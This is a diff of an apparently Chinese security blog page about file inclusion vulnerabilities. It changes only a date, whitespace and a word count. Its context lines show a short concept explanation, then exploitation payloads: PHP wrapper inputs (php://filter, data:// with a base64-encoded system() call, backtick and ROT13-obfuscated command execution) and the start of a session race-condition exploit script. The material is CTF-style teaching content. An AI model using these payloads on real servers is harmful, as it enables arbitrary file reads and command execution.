@@ -403,7 +403,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-12
+                    2023-04-13
                 </div>
                 
 
@@ -440,7 +440,9 @@
                 <h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>文件包含漏洞是指应用程序在处理文件路径时，没有进行足够的验证<br>导致攻击者可以利用此漏洞读取任意文件，执行任意代码甚至获取系统权限。 </p>
 <p>这种漏洞通常出现在应用程序中动态引用文件的代码中<br>或是出现在用户可以控制文件名、文件路径或文件内容的输入参数上。<br>攻击者可以在这些参数中注入特定的字符，从而构造一个恶意文件路径并被应用程序读取<br>应用程序没有对这个路径进行验证，最终导致攻击者可以获取系统权限或读取任意文件。 </p>
 <p>在开发应用程序时，需要对文件路径进行验证<br>并遵循最小权限原则，确保应用程序具有最小的访问权限。<br>此外，使用白名单或安全沙箱技术也可以帮助防止文件包含漏洞的发生</p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><pre><code>【使用伪协议读取文件】
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><pre><code>
+
+【使用伪协议读取文件】
 参数=php://filter/convert.base64-encode/resource=目标文件
 file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==    
 file=data://text/plain,&lt;?=`tac f*`;?&gt;
@@ -490,7 +492,9 @@ EXP放在了文末
 &lt;?=flfgrz(&#39;gnp s*.cuc&#39;);?&gt;  ————&gt;  &lt;?=system(&#39;tac f*.php&#39;);?&gt;
 </code></pre>
 <p>session文件条件竞争EXP</p>
-<pre><code>import requests
+<pre><code>
+
+import requests
 import io
 import threading
 
@@ -842,7 +846,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">79.6k</span>
+                        class="white-color">81.8k</span>
             
             
             
